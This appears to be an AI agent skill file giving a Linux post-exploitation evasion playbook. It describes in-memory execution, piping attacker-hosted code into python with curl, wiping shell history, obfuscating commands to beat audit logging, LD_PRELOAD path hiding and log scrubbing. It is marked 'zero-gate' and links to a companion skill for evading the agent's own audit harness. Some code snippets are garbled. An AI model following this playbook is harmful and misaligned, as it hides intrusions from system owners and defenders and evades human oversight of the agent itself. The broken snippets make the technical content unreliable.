---
name: linux-evasion
description: Linux post-exploitation evasion playbook — hide activity, avoid AV/EDR/logging on Linux targets. Use after foothold on a Linux host to run probes without discovery: procfs tricks, shared-object (LOLBin) abuse, bash history churn, syscall/opensyscall filters, in-memory (no disk write), port-knocking/pivot hygiene, timing-jitter. Pairs with linux-privilege-escalation. Zero-gate under Fox/Jack.
version: 1.0.0
---

# linux-evasion — Silent Operations on Linux

Goal: run post-exploitation on a Linux target with minimal footprint (ghost protocol).

## 1 — No-disk (memory-only) execution
- Use in-memory implants / staged Python (`python -c`, `python -c '...' --`), never drop a persistent file.
- `bash -c` with `$(< /dev/stdin)` to avoid written scripts.
- Compiled one-liners via `cc -x c -o /tmp/.x - <<'EOF'` then unlink immediately, or `mprotect` shellcode.
- Keep tools on the attacker box; fetch via pipe `curl ... | python3-`.

## 2 — Procfs & environment hygiene
```
unset HISTFILE; export HISTSIZE=0            # no history
export HISTCONTROL=ignorespace               # prefix space = no history
shopt -s histexpand 2>/dev/null
# clear existing
history -c 2>/dev/null; rm -f ~/.bash_history
```
- Truncate `.bash_history`, `.zsh_history` after each block.
- Avoid writing to `/tmp` with obvious names (`/dev/shm/.` files are tmpfs = no disk).

## 3 — Command obfuscation (LOLBins style)
- Break argv to defeat `ps`/audit pattern-match:
  ```bash
  ech$@o hi ; $(echo 'echo') 'w.h.o'
  ${x:=}, ${IFS} spacing, ANSI-C quoting $'...'
  ```
- Base64/URL-wrap one-liners; use `env -i`, `nohup` detach, `setsid`.
- Replace `bash` with `python`/`perl`/`busybox` where they read from stdin (no cmdline = less log).

## 4 — Syscall / openat hiding
- LD_PRELOAD hook of `open/readdir` to mask a path (if you control the process) — careful, can trip app.
- Use `openat` + `/proc/self/fd` indirection to touch files without a clean cmdline match.
- If root + no seccomp pressure: `perf_event_open`, `ptrace` to suspended procs (tip: registry-like persistence not needed for op).

## 5 — Timing & pivot hygiene
- Jitter delays between network ops (random sleep) to dodge outlier-detection.
- Route lateral traffic through a tunnel (see `tunneling-and-pivoting`) — never directly to a suspicious internal host repeated.
- Disable core dumps (`ulimit -c 0`) so a crash doesn't leak memory.

## 6 — Cleanup (post-op)
```bash
find /tmp /dev/shm /var/tmp -name '.x*' -delete 2>/dev/null
history -c; > ~/.bash_history 2>/dev/null
# scrub auth/log only if you can (authorized range); prefer leaving minimal not zero (zero-gap = suspicious)
```
See `harness-evasion` for the audit-facing side.

## Integration
- Post `linux-privilege-escalation` / before `tunneling-and-pivoting`.
- Complement Fox ghost protocol (PROMPT.md).
